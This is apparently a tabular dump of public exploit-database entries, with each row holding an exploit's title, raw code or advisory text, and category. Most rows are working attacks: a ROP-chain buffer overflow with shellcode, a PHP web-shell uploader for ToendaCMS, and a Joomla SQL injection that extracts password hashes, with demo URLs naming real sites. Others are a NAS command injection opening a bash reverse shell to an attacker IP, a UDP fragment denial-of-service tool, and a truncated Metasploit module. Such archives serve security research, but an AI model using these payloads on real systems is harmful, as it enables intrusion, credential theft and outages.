0x41414141, # Junk for EDI             0x41414141, # Junk for EBX                          # Write dwSize parameter to memory             0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]               #### Write flNewProtect parameter to memory             # EAX = 0x40             0x1001a503, # XOR EAX,EAX / RETN [MSRMfilter03.dll]             0x10031c81, # ADD EAX,40 # POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP                          # EDX = EDX + 4             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX                          # Write flNewProtect parameter to memory             0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]               #### Call VirtualProtect             0x1002fa6a, # MOV EAX,EDX / RETN [MSRMfilter03.dll]             0x1001263D, # POP ECX / RETN [MSRMfilter03.dll]             0xFFFFFFF0, # -0x10 (Move EDX back to the VirtualProtect call)             0x1001451e, # ADD EAX,ECX / RETN [MSRMfilter03.dll]             0x1002fe81, # XCHG EAX,ESP / RETN [MSRMfilter03.dll]         ]  nops = ""\x90"" * 240  # calc.exe payload shellcode = ( ""\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52"" ""\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E"" ""\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C"" ""\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F"" ""\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7"" )   print ""Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30"" print ""Local buffer overflow (\w ASLR and DEP bypass)\n""  payload = hdr + junk1 + pack('<'+str(len(rop))+'L',*rop) + nops + shellcode  f = open(fname, ""w"") f.write(payload) f.close()  print ""%s file created!"" % fname",Local Buffer Overflow,1
2035,"ToendaCMS 1.0.0 - 'FCKeditor' Arbitrary File Upload #!/usr/bin/php -q -d short_open_tag=on <? echo ""ToendaCMS <= 1.0.0 Shizouka stable 'F(u)CKeditor' remote commands execution\n""; echo ""by rgod rgod@autistici.org\n""; echo ""site: http://retrogod.altervista.org\n""; echo ""dork: \""toendaCMS is Free Software released under the GNU/GPL License.\"" | \""powered by toendaCMS\"" -inurl:demo\n\n"";  //works regardless of any php.ini settings,   if ($argc<4) { echo ""Usage: php "".$argv[0]."" host path cmd OPTIONS\n""; echo ""host:      target server (ip/hostname)\n""; echo ""path:      path to toendacms\n""; echo ""cmd:       a shell command\n""; echo ""Options:\n""; echo ""   -p[port]:    specify a port other than 80\n""; echo ""   -P[ip:port]: specify a proxy\n""; echo ""Example:\n""; echo ""php "".$argv[0]."" localhost /cms/ ls -la\n""; die; } error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; }  $host=$argv[1]; $path=$argv[2]; $port=80; $proxy=""""; $cmd=""""; for ($i=3; $i<=$argc-1; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } }  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  $shell=""<?php echo chr(72).\""i Master!\"";if(get_magic_quotes_gpc()){\$_COOKIE[\""cmd\""]=stripslashes(\$_COOKIE[\""cmd\""]);}""; $shell.=""ini_set(\""max_execution_time\"",0);error_reporting(0);""; $shell.=""echo \""*delim*\"";passthru(\$_COOKIE[\""cmd\""]);?>""; $allowed_extensions = array(""zip"",""doc"",""xls"",""pdf"",""rtf"",""csv"",""jpg"",""gif"",""jpeg"",""png"",""avi"",""mpg"",""mpeg"",""swf"",""fla""); for ($i=0; $i<=count($allowed_extensions)-1; $i++){ $filename=""suntzu.php."".$allowed_extensions[$i]; $data=""-----------------------------7d529a1d23092a\r\n""; $data.=""Content-Disposition: form-data; name=\""NewFile\""; filename=\""$filename\""\r\n""; $data.=""Content-Type:\r\n\r\n""; $data.=""$shell\r\n""; $data.=""-----------------------------7d529a1d23092a--\r\n""; $packet=""POST "".$p.""engine/js/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); //echo $html; $packet=""GET "".$p.""data/images/File/"".$filename."" HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Cookie: cmd="".$cmd.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); //echo $html; if (eregi(""Hi Master!"",$html)){ $temp=explode(""*delim*"",$html); die($temp[1]);} } //if you are here... echo ""Exploit failed...""; ?>  # milw0rm.com [2006-07-18]",Arbitrary File Upload,1
32305,"Dreambox - Web Interface URI Remote Denial of Service source: https://www.securityfocus.com/bid/30919/info  Dreambox is prone to a remote denial-of-service vulnerability.  Attackers can exploit this issue to crash the affected device, denying service to legitimate users. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.  Dreambox DM500C is vulnerable; other models may also be affected.   open|send GET http://www.example.com/aaa(...) HTTP/1.0\n\n|sleep|close|pattern_not_exists HTTP/1.# ### *",Web Interface URI Remote Denial of Service,1
47897,"TotalAV 2020 4.14.31 - Privilege Escalation # Exploit Title: TotalAV 2020 4.14.31 - Privilege Escalation # Date: 2020-01-09 # Exploit Author: Kusol Watchara-Apanukorn # Vendor Homepage: https://www.totalav.com/ # Version: 4.14.31 # Fixed on:  5.3.35 # Tested on: Windows 10 x64 # CVE : CVE-2019-18194  # Vulnerability Description: # TotalAV 2020 4.14.31 has quarantine flaw that allows attacker escape of # privilege by using NTFS directory junction.  **You can download vulnerability version with this link: https://install.protected.net/windows/cdn3/4.14.31/TotalAV_Setup.exe  ///////////////////////////////////    Proof of Concept ////////////////////////////////// 1. Plant the malicious file in this case we use DLL file 2. To exploit the vulnerability antivirus must detect the malicious dll 3. Move it to quarantine. 4. Attacker must create NTFS directory junction to restore  Full step: https://www.youtube.com/watch?v=88qeaLq98Gc   Vulnerability Disclosure Timeline: ================================== 17 Oct, 19 : Found Vulnerability 18 Oct, 19 : Vendor Notification 18 Oct, 19 : Request CVE 21 Oct, 19 : Vendor Response mid Dec, 19  : Vendor released new patched (v5.3.35) 09 Jan, 20: Vulnerability Disclosure",Privilege Escalation,1
45995,"Facebook And Google Reviews System For Businesses 1.1 - Remote Code Execution # Exploit Title: Facebook And Google Reviews System For Businesses 1.1 - Remote Code Execution # Dork: N/A # Date: 2018-12-14 # Exploit Author: Ihsan Sencan # Vendor Homepage: https://codecanyon.net/item/facebook-and-google-reviews-system-for-businesses/22793559 # Version: 1.1 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1)  # http://localhost/[PATH]/reviews/campaign_add.php?id=[SQL] #   POST /[PATH]/reviews/action.php?action=custom_reviews HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/octet-stream Content-Length: 922 Referer: http://localhost/[PATH]/reviews/custom_reviews_add.php Cookie: PHPSESSID=t7hinqk30gq4ies69nno1lj2b0 DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 -----------------------------4704926813981: undefined Content-Disposition: form-data; name=""photo""; filename=""phpinfo.php"" <?php phpinfo(); ?> -----------------------------4704926813981 Content-Disposition: form-data; name=""hidden_photo"" -----------------------------4704926813981 Content-Disposition: form-data; name=""name"" Efe -----------------------------4704926813981 Content-Disposition: form-data; name=""rating"" 4.5 -----------------------------4704926813981 Content-Disposition: form-data; name=""review"" Efe -----------------------------4704926813981 Content-Disposition: form-data; name=""date"" 12/14/2018 -----------------------------4704926813981 Content-Disposition: form-data; name=""id"" -----------------------------4704926813981 Content-Disposition: form-data; name=""submit"" submit -----------------------------4704926813981-- HTTP/1.1 302 Found Date: Fri, 14 Dec 2018 18:17:48 GMT Server: Apache X-Powered-By: PHP/7.0.33 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache location: custom_reviews.php Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8  GET /[PATH]/reviews/uploads/264082phpinfo.php HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: */* Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://localhost/[PATH]/reviews/custom_reviews.php Cookie: PHPSESSID=t7hinqk30gq4ies69nno1lj2b0 DNT: 1 Connection: keep-alive HTTP/1.1 200 OK Date: Fri, 14 Dec 2018 18:17:49 GMT Server: Apache X-Powered-By: PHP/7.0.33 Keep-Alive: timeout=5, max=99 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8",Remote Code Execution,1
22312,Apple QuickTime/Darwin Streaming Server 4.1.x - 'parse_xml.cgi' File Disclosure source: https://www.securityfocus.com/bid/6990/info  A file retrieval vulnerability has been reported for QuickTime/Darwin Streaming Server. The vulnerability exists due to insufficient sanitization of some parameters given to the parse_xml.cgi script. Information obtained in this manner may be used by an attacker to launch more organinzed attacks against a vulnerable system.  This vulnerability was tested on SS for Microsoft Windows systems.   http://localhost:1220/parse_xml.cgi?filename=.../qtusers,File Disclosure,1
9126,"Joomla! Component com_category - 'catid' SQL Injection ############################################################### # Joomla component 'com_category' SQL injection vulnerability ########### ################################################################ #version: 1.0.12################################################### ################################################################ #dork:inurl:""com_category""########################################## # ############################################################### # xploited by Prince_Pwn3r########################################## ################################################################ # contact: 2p0wn0rN0t2p0wn@gmail.com############################## ################################################################  +++++++ greetz to all p0wnbox.com members !!! +++++++ --------------------------------------------------------------------------------------  Vulnerable joomla component : com_category vulnerable parameter: ""edit"" ($_GET)  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------  Exploit :   http://www.site.com/index.php?option=com_category&task=loadCategory&catid*=-9999+UNION+SELECT+1,2,group_concat(username,0x3a,password),4,5+from+jos_users--  Demos :  http://www.hendrygroup.com.au/index.php?option=com_category&task=loadCategory&catid=-9999+AND+1=0+union+all+select%201,2,group_concat(username,0x3a,password),4,5+from+jos_users-- or http://teachandsay.com/index.php?option=com_category&id=12&task=view&color=3&cat_id=-9999+UNION+SELECT+1,2,group_concat(username,0x3a,password),4,5+from+jos_users--  *could be different (eg: view&color=3&cat_id=)  # milw0rm.com [2009-07-11]",SQL Injection,1
4846,"Uebimiau Web-Mail 2.7.10/2.7.2 - Remote File Disclosure ----[ Uebimiau Web-Mail Remote File Reader ... ITDefence.ru Antichat.ru ]  							Uebimiau Web-Mail Remote File Reader 							Eugene Minaev underwater@itdefence.ru 				___________________________________________________________________ 			____/  __ __ _______________________ _______  _______________    \  \   \ 			/ .\  /  /_// //              /        \       \/      __       \   /__/   / 			/ /     /_//              /\        /       /      /         /     /___/ 			\/        /              / /       /       /\     /         /         / 			/        /               \/       /       / /    /         /__       //\ 			\       /    ____________/       /        \/    __________// /__    // /    			/\\      \_______/        \________________/____/  2007    /_//_/   // //\ 			\ \\                                                               // // / 			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / .  			. \_\\________[________________________________________]_________//_//_/ . . 		  		 		At first i decided to look login script . Each script includes this code 		 		<?php 		if(strlen($f_pass) > 0) {  		..elseif ( 		($sess[""auth""] && intval((time()-$start)/60) < $idle_timeout)) {  		$UM->mail_user   = $f_user    = $sess[""user""]; 		$UM->mail_pass   = $f_pass    = $sess[""pass""]; 		$UM->mail_server = $f_server  = $sess[""server""]; 		$UM->mail_email  = $f_email   = $sess[""email""];  		} else { 		Header(""Location: ./index.php?tid=$tid&lid=$lid\r\n"");  		exit;  		}  		?> 		 		So , if register_globals on , we can make a request like script.php?f_pass=+toxa+&sess[auth]=1  		to make script think that we are authorized user . Then i looked each script to find something  		interest. 		 		<?php 		define(""SMARTY_DIR"",""./smarty/""); 		require_once(SMARTY_DIR.""Smarty.class.php""); 		$smarty = new Smarty; 		$smarty->compile_dir = $temporary_directory; 		$smarty->security=true; 		$smarty->secure_dir=array(""./""); 		$smarty->assign(""umLanguageFile"",$selected_language."".txt"");   		?> 		 		Looks great  :)  But selected_language was already defined . But there was a similar code with EXTRACT. 		So , we can read local files on server ! 		 		<?php 		if($phpver >= 4.1) { 		extract($_GET); 		}  		$smarty->assign(""umSid"",$sid); 		$smarty->assign(""umLid"",$lid); 		$smarty->assign(""umTid"",$tid);  		$smarty->assign(""umErrorCode"",$err);  		$smarty->display(""$selected_theme/error.htm""); 		?> 		 		http://test1.ru/uebimiau/error.php?f_pass=blackybr&sess[auth]=1&selected_theme=../ksuri.php%00 		 		 		  ----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]  # milw0rm.com [2008-01-06]",Remote File Disclosure,1
40207,"NASdeluxe NDL-2400r 2.01.09 - OS Command Injection -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512  Advisory ID: SYSS-2016-065 Product: NASdeluxe NDL-2400r Vendor: Starline Computer GmbH Affected Version(s): 2.01.10 Tested Version(s): 2.01.09  Vulnerability Type: OS Command Injection (CWE-78) Risk Level: High Solution Status: no fix (product has reached EOL since 3 years) Vendor Notification: 2016-07-04 Public Disclosure: 2016-08-03 CVE Reference: Not assigned Author of Advisory: Klaus Eisentraut, SySS GmbH, https://www.syss.de/advisories/  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Overview:  The product ""NASdeluxe NDL-2400r"" [3] is vulnerable to OS Command Injection as root. No credentials are required to exploit this vulnerability.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Vulnerability Details / Proof-of-Concept:  The language parameter in the web interface login request of the product  ""NASdeluxe NDL-2400r"" is vulnerable to an OS Command Injection as root.  The SySS GmbH sent the following HTTPS request to the webinterface:  ~~~~~ POST /usr/usrgetform.html?name=index HTTP/1.1 Host: 192.168.1.1 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 97  lang=||`bash+-i+>%26+/dev/tcp/192.168.1.2/443+0>%261`&username=&pwd=&site=web_disk&login_btn=Einloggen ~~~~~  After sending the request, a reverse shell connected back:  ~~~~~ # nc -lvvp 443 Listening on any address 443 (https) Connection from 192.168.1.1:49070 bash: no job control in this shell bash-3.00# whoami root bash-3.00# cat /img/version 2.01.09 ~~~~~  The tested firmware version was 2.01.09. The most current version is  2.01.10 according to the web page of the vendor [3]. However there are no hints of a security update in the release notes [4]. Thus, the SySS  GmbH assumes that this vulnerability is likely also present in the most  current firmware version from 2009-10-22.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Solution:  The product has reached end-of-life (EOL) status since more than three  years. Thus, no patch will be provided by the vendor.  It is highly recommended to migrate to one of the newer and still  supported NAS solutions which are (according to Starline Computer GmbH)  not affected by this vulnerability.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Disclosure Timeline:  2016-06-29: Vulnerability discovered 2016-07-04: asked info@starline.de for contact person (no answer) 2016-07-22: sent this advisory to info@starline.de 2016-07-22: response from vendor: won't fix (product reached EOL >3 years) 2016-08-03: public disclosure  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  References:  [1] SySS GmbH, SYSS-2016-065     https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-065.txt [2] SySS GmbH, SySS Responsible Disclosure Policy     https://www.syss.de/en/news/responsible-disclosure-policy/ [3] NASdeluxe Homepage     https://www.nasdeluxe.com/ [4] NDL-2400R Firmware Release Notes      https://www.nasdeluxe.com/wp-content/uploads/2008/12/NDL-2400R_NDL-2500T_FWRN_v2_01_10.171.pdf  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Credits:  This security vulnerability was found by Klaus Eisentraut of the SySS GmbH.  E-Mail: klaus.eisentraut@syss.de Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Klaus_Eisentraut.asc Key ID: 0xBAC677AE Key Fingerprint: F5E8 E8E1 A414 4886 0A8B 0411 DAB0 4DB5 BAC6 77AE  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Disclaimer:  The information provided in this security advisory is provided ""as is""  and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible. The latest version of this security advisory is available on the SySS Web site.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Copyright:  Creative Commons - Attribution (by) - Version 3.0 URL: http://creativecommons.org/licenses/by/3.0/deed.en  -----BEGIN PGP SIGNATURE-----  iQIcBAEBCgAGBQJXoddNAAoJENqwTbW6xneuMdwQANnc0LC5n+5Hz/jd/C4y6Vo/ V4rTM2ZeKHoinwaNe8wDqwLojVi370xkroe592skBuGaHsACpqVU/+i1uzez4Fd5 zv9FL0O16qeU4ATt0tlTMzBka+3l7+W46JjIt30auKXvb2C7HXlwru58HvMRoDUr 5ga48/C2tLAWeogR0hpflXg6xUmTTfZRL1zgEh4/etz8vA0DgwXl7fRQZq7z2fDF L4oSrQ2oumS+IWH8qAUo/Tvd8al/OSQC+QfLjwxhpwb3n8nRrUaa2gYLuKvSXn3R Sc8nuR+YuO4c+kXcUO2HQ2mpmSRKITOGOgqDwxiSHitTpGwkJiwh2PwRP45BJxTe g99ivjeRUKkXlAkNZ3u38OYzSmPcf455fwGANFaBjljJtd5Z+Je9mqL2jnUvB1O1 ERFuyhDr1VKLiM4BQp3/hgqECHQRjiX7jUN0yHA3PWiM55wzHyftAti5K/XKSKTv tFB19VoC+oJEA1i19uzv7xFscfiPHuRw0coGP2KSVwA2L3bIOLlMwWt/Ea/Qzcur 9JIUHX0+kKxJcLb6hthasQ4lIf2Jhjd4aFR+rPcJLL29r7HGOSoQLErXz2QmcePJ 1jKC6O2N2vrmrIZ+JOvWP99v0bIqC/857Xz5p30OUUjx2yLjpP/t5paidH1qlUMs 4mefqh41S76I3EZJpQn3 =V6E3 -----END PGP SIGNATURE-----",OS Command Injection,1
48251,"10-Strike Network Inventory Explorer - 'srvInventoryWebServer' Unquoted Service Path # Exploit Title: 10-Strike Network Inventory Explorer - 'srvInventoryWebServer' Unquoted Service Path # Date: 2020-03-24 # Author: Felipe Winsnes # Vendor Homepage: https://www.10-strike.com/ # Software Link: https://www.10-strike.com/networkinventoryexplorer/network-inventory-setup.exe # Version: 8.54 # Tested on: Windows 7  # Step to discover Unquoted Service Path:   C:\Users\IEUser>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v ""C:\Windows\\"" | findstr /i /v """""" srvInventoryWebServer     srvInventoryWebServer     C:\Program Files\10-Strike Network Inventory Explorer\InventoryWebServer.exe             Auto  # Service info:  C:\>sc qc srvInventoryWebServer [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: srvInventoryWebServer         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files\10-Strike Network Inventory Explorer\InventoryWebServer.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : srvInventoryWebServer         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem  C:\>  # Exploit:  # A successful attempt would require the local user to be able to insert their code in the # system root path undetected by the OS or other security applications where it could # potentially be executed during application startup or reboot. If successful, the local # user's code would execute with the elevated privileges of the application.",Unquoted Service Path,1
17964,"IRAI AUTOMGEN 8.0.0.7 - Use-After-Free #######################################################################                               Luigi Auriemma  Application:  IRAI AUTOMGEN               http://www.irai.com/a8e/ Versions:     <= 8.0.0.7 (aka 8.022) Platforms:    Windows Bug:          use after free Exploitation: file Date:         10 Oct 2011 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   From vendor's website: ""Universal automation workshop Fonctionnalities : automation projects creation for PLC and microprocessors, SCADA, Web SCADA, 3D process simulation, etc.""   #######################################################################  ====== 2) Bug ======   Use after free in the handling of project files containing some malformed fields like the size of the embedded zip archive or some counters that may allow code execution.  No additional research performed because it was only a quick test, the following are various examples of locations for the possible code execution:    00460ee6 8b01            mov     eax,dword ptr [ecx]   00460ee8 6a01            push    1   00460eea ff5004          call    dword ptr [eax+4]    005239ca 8b06            mov     eax,dword ptr [esi]   005239cc 8bce            mov     ecx,esi   005239ce ff5010          call    dword ptr [eax+10h]    0040d11b 8b16            mov     edx,dword ptr [esi]   0040d11d 6a00            push    0   0040d11f 50              push    eax   0040d120 8bce            mov     ecx,esi   0040d122 ff9288000000    call    dword ptr [edx+88h]   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/poc/automgen_1.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17964.zip   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",Use-After-Free,1
1496,"D-Link Wireless Access Point - Fragmented UDP Denial of Service /*  *    * Aaron Portnoy  *    * silc.thunkers.net, thunkers  *    * D-Link Wireless Access Point  * Fragmented UDP DoS Proof of Concept   *    *  * gcc -o dlink_dos dlink_dos.c -lnet -Wall   *      */           #include <libnet.h>      #define DEVICE ""eth0"" #define SRC_IP ""127.0.0.1"" #define DST_IP ""127.0.0.1"" #define SRC_PRT 200 #define DST_PRT 11111      void usage (char *name) {        fprintf (stderr,              ""Usage: %s -s <source ip> -d <destination ip>\  			-a <source port> -b <destination port> \n"",              name);              exit (EXIT_FAILURE); }      int gen_packet (char *device, char *pSRC, char *pDST, u_short sPRT,                 u_short dPRT, int count) {                                 libnet_t *l = NULL;     libnet_ptag_t udp = 0;     libnet_ptag_t ip = 0;          char errbuf[LIBNET_ERRBUF_SIZE];     char *payload = NULL;     u_short payload_s = 0, src_prt, dst_prt;     u_long src_ip, dst_ip;     int c, frag;              if (!device)         device = DEVICE;              l = libnet_init (LIBNET_RAW4, device, errbuf);      if (!l) {         fprintf (stderr, ""libnet_init() failed: %s\n"", errbuf);         exit (EXIT_FAILURE);     } 	     src_ip = pSRC ? libnet_name2addr4 (l, pSRC, LIBNET_RESOLVE) :         libnet_name2addr4 (l, SRC_IP, LIBNET_RESOLVE);      dst_ip = pDST ? libnet_name2addr4 (l, pDST, LIBNET_RESOLVE) :         libnet_name2addr4 (l, DST_IP, LIBNET_RESOLVE);      src_prt = sPRT ? sPRT : SRC_PRT;      dst_prt = dPRT ? dPRT : DST_PRT;      if (count == 1) {         payload = ""\0\0\0\0\0\0\0\0"";         payload_s = 8;     }      udp = libnet_build_udp (src_prt,                             dst_prt,                             (LIBNET_UDP_H + payload_s) * 2,                             0, (unsigned char *)payload, payload_s, l, udp);      if (udp == -1) {         fprintf (stderr, ""Can't build UDP header: %s\n"", libnet_geterror (l));         exit (EXIT_FAILURE);     }      switch (count) {      case 1:         frag = IP_MF;         break;      case 2:         frag = 0x2002;         break;      case 3:         frag = 0x0003;         break;     }      ip = libnet_build_ipv4 (20,                             0,                             1800,                             frag,                             128,                             IPPROTO_UDP, 0, src_ip, dst_ip, NULL, 0, l, ip);      if (ip == -1) {         fprintf (stderr, ""Can't build IP header: %s\n"", libnet_geterror (l));         exit (EXIT_FAILURE);     }      c = libnet_write (l);      if (c == -1) {         fprintf (stderr, ""Write error: %s\n"", libnet_geterror (l));         exit (EXIT_FAILURE);     }      printf (""Wrote UDP packet; check the wire.\n"");      libnet_destroy (l);      return (EXIT_SUCCESS);  }  int main (int argc, char **argv) {      int i;     char *pDST, *pSRC, *device;     u_short dPRT = 0;     u_short sPRT = 0;      pDST = pSRC = device = NULL;      while ((i = getopt (argc, argv, ""D:d:s:a:b:h"")) != EOF) {         switch (i) {         case 'D':             device = optarg;             break;         case 'd':             pDST = optarg;             break;         case 's':             pSRC = optarg;             break;         case 'a':             sPRT = atoi (optarg);             break;         case 'b':             dPRT = atoi (optarg);             break;         case 'h':             usage (argv[0]);             break;         }     }      printf (""\n----------------------------------\n"");     printf (""      -=    D-Link DoS PoC     =-\n"");     printf (""          Aaron Portnoy\n"");     printf (""       deft () thunkers ! net     \n"");     printf (""   silc.thunkers.net, thunkers\n"");     printf (""----------------------------------\n"");       device ? printf (""\nDevice: \t%s\n"", device) :         printf (""\nDevice: \t%s\n"", DEVICE);      pSRC ? printf (""SRC IP: \t%s\n"", pSRC) :         printf (""SRC IP: \t%s\n"", SRC_IP);      pDST ? printf (""DST IP: \t%s\n"", pDST) :         printf (""DST IP: \t%s\n"", DST_IP);      sPRT ? printf (""SPort: \t\t%d\n"", sPRT) :         printf (""SPort: \t\t%d\n"", SRC_PRT);      dPRT ? printf (""DPort: \t\t%d\n\n"", dPRT) :         printf (""DPort: \t\t%d\n\n"", DST_PRT);      for (i = 1; i <= 3; i++)         gen_packet (device, pSRC, pDST, sPRT, dPRT, i);     printf (""\n"");      return (EXIT_SUCCESS); }  // milw0rm.com [2006-02-14]",Fragmented UDP Denial of Service,1
16432,"Firebird Relational Database - 'isc_create_database()' Remote Buffer Overflow (Metasploit) ## # $Id: fb_isc_create_database.rb 9669 2010-07-03 03:13:45Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::BruteTargets  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'Firebird Relational Database isc_create_database() Buffer Overflow', 			'Description'	=> %q{ 					This module exploits a stack buffer overflow in Borland InterBase 				by sending a specially crafted create request. 			}, 			'Version'	=> '$Revision: 9669 $', 			'Author'	=> 				[ 					'ramon', 					'Adriano Lima <adriano@risesecurity.org>', 				], 			'Arch'		=> ARCH_X86, 			'Platform'	=> 'win', 			'References'	=> 				[ 					[ 'CVE', '2007-5243' ], 					[ 'OSVDB', '38606' ], 					[ 'BID', '25917' ], 					[ 